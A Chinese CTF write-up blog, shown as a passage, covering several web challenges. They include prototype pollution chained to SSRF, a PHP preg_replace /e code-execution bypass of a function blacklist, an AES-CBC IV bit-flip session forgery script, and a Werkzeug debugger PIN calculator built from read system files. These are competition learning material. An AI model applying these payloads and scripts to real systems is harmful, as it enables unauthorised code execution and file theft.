class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>;`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> filtered_cookie;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> remote_res = <span class="keyword">await</span> (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">post</span>(url, req.<span class="property">body</span>, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">get</span>(url, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">405</span>);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&quot;method not allowed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    res.<span class="title function_">status</span>(remote_res.<span class="property">status</span>);</span><br><span class="line">    res.<span class="title function_">header</span>(remote_res.<span class="property">headers</span>);</span><br><span class="line">    res.<span class="title function_">write</span>(remote_res.<span class="property">data</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;unreachable url.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="keyword">typeof</span> username != <span class="string">&quot;string&quot;</span> ||</span><br><span class="line">    <span class="keyword">typeof</span> password != <span class="string">&quot;string&quot;</span> ||</span><br><span class="line">    !username ||</span><br><span class="line">    !password</span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!userStorage[username]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userStorage[username].<span class="property">password</span> !== password) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;login success&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// under development</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/info&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">update</span>(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">info</span>, req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">sendStatus</span>(<span class="number">200</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/home&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;home&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">    <span class="attr">strategy</span>: (<span class="function">(<span class="params">list</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> result = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> list) &#123;</span><br><span class="line">        result.<span class="title function_">push</span>(&#123;<span class="attr">host</span>: key, <span class="attr">allow</span>: list[key]&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;)(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">strategy</span>),</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// demo service behind webvpn</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    req.<span class="property">headers</span>.<span class="property">host</span> != <span class="string">&quot;127.0.0.1:3000&quot;</span> ||</span><br><span class="line">    req.<span class="property">hostname</span> != <span class="string">&quot;127.0.0.1&quot;</span> ||</span><br><span class="line">    req.<span class="property">ip</span> != <span class="string">&quot;127.0.0.1&quot;</span> </span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`app listen on <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>说实话之前基本没做过这么长的代码审计，看着就头大。我们先看flag路由。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    req.<span class="property">headers</span>.<span class="property">host</span> != <span class="string">&quot;127.0.0.1:3000&quot;</span> ||</span><br><span class="line">    req.<span class="property">hostname</span> != <span class="string">&quot;127.0.0.1&quot;</span> ||</span><br><span class="line">    req.<span class="property">ip</span> != <span class="string">&quot;127.0.0.1&quot;</span> </span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>我们发现其需要本地的机器访问才可以查看到flag，那么我们就需要考虑ssrf漏洞，即这么利用靶机来访问本地的这个flag路由。我们在一开始登陆进网站时我们会发现一个网页跳转的页面<br><img src="/2024/02/26/hgameweek3/1.png" class="" title="alt text"><br>发现是/proxy路由<br>我们看看代码会发现proxy路由网页跳转的限制条件是如下的代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!userStorage[username].<span class="property">strategy</span>[url.<span class="property">hostname</span>]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;your url is not allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>我们查找userStorage这个类，会发现userStorage[username].strategy[url.hostname]指向的就是<code>&quot;baidu.com&quot;: true</code>就是true这个变量。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> userStorage = &#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">    <span class="attr">info</span>: &#123;</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">strategy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;baidu.com&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&quot;google.com&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>我们在审计一下源码可以发现其有着明显的原型链污染漏洞<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key.<span class="title function_">indexOf</span>(<span class="string">&quot;__&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[key] == <span class="string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">update</span>(dst[key], src[key]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dst[key] = src[key];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现update是一个交换函数，并且其只过滤了<strong>那么就会造成原型链污染。<br>过滤了</strong>我们可以使用<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>要修改的原型的内容<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>来代替。<br>可以进行原型链污染的路由是/user/login<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/info&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">update</span>(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">info</span>, req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">sendStatus</span>(<span class="number">200</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>我们可以通过req.body来进行原型链污染，即我们可以通过post传入的值进行原型链污染。<br>那么答案就呼之欲出了<br>我们可以使用原型链污染塞入<code>127.0.0.1:true</code>那么我们就可以使用proxy来访问127.0.0.1:3000/flag来得到flag<br>payload<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;127.0.0.1&quot;:&quot;true&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br>之后就可以直接使用/proxy来访问flag了。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proxy?url=http://127.0.0.1:3000/flag</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>hnctf wp</title>
    <url>/2024/05/13/hnctf-wp/</url>
    <content><![CDATA[<h1 id="周末打了一下hnctf，稍微写一下wp吧。写了五道web。"><a href="#周末打了一下hnctf，稍微写一下wp吧。写了五道web。" class="headerlink" title="周末打了一下hnctf，稍微写一下wp吧。写了五道web。"></a>周末打了一下hnctf，稍微写一下wp吧。写了五道web。</h1><h1 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先看到了preg_replace,那么这里就存在命令执行，我们会发现其禁用了很多函数。但是没有禁scandir和highlight_file，那么我们就可以利用这两个函数来读文件。<br>而str2的正则是对大小写敏感的。而preg_replace用了i修饰符。那么我们可以使用大小写绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">task=print_r(scandir(chr(47)));&amp;flag=please_give_me_flaG #查看根目录下的文件</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Cookie:PHPSESSID=/flag</span><br><span class="line">task=highlight_file(session_id(session_start()));&amp;flag=please_give_me_flaG #读取flag</span><br></pre></td></tr></table></figure></p>
<h1 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>这题有点难绷，给人一种是密码手出的密码题的感觉。<br>以为没什么密码基础，我直接卡在了第一步，怎么伪造session。后来在水群的时候出题人说该题目思路来自于老外，于是我就在网上查能不能找到类似的session伪造方法，结果就让我查到了(tamuctf)[<a href="https://github.com/tamuctf/tamuctf-2024/tree/master/web/flipped">https://github.com/tamuctf/tamuctf-2024/tree/master/web/flipped</a>]<br>发现其为ASE CBC加密的翻转攻击。 。。。这不是密码是什么<br>我直接把wp的脚本改了一下就直接用了<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># iv</span></span><br><span class="line"><span class="comment"># &#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="comment"># ername&quot;: &quot;guest&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(<span class="string">&quot;eeAq7MHva/ci36jjUfDoG7QuxPZ1ZNCS0QZrCMAUoMRZAIMDu2YVwO2pVB/d/IVkczV8PNLAVjNI3MghDv/pew==&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(cipher))</span><br><span class="line"></span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line">iv = array_cipher[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"></span><br><span class="line">decode_plain = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始明文</span></span><br><span class="line">plain = <span class="string">&#x27;&#123;&quot;admin&quot;: 1, &quot;us&#x27;</span></span><br><span class="line"></span><br><span class="line">newiv = <span class="built_in">list</span>(iv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">    newiv[i] = (<span class="built_in">ord</span>(plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)) ^ iv[i] ^ <span class="built_in">ord</span>(decode_plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">newiv = <span class="built_in">bytes</span>(newiv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newiv:&#x27;</span>, base64.b64encode(newiv + cipher[<span class="number">16</span>:]))</span><br></pre></td></tr></table></figure><br>经过这样处理的session解密处理的admin就是1了。<br>之后就是读取文件来计算pin值了<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctfUser&#x27;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;191387107621224&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&quot;d8c226fb-ceb1-4366-ad71-e8e995dc3065fdb2ec0912d863176b2644451101612d45cb5275f4233b89a916779f4f089ce3&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><br>读取其他文件时没有遇到什么情况，但是当读取machine-id是遇到了waf。我尝试使用unicode来尝试绕过发现绕不过去。<br>虽然我们无法读取/proc/self/cgroup但是我们可以使用1来代替self，而/proc/self/mountinfo和/proc/self/cpuset都有/proc/self/cgroup的内容。p<br>这题我们使用/proc/1/cpuset来代替/proc/self/cgroup，之后就是计算pin进行rce。</p>
<h1 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h1><img src="/2024/05/13/hnctf-wp/ezflask.png" class="" title="alt text">
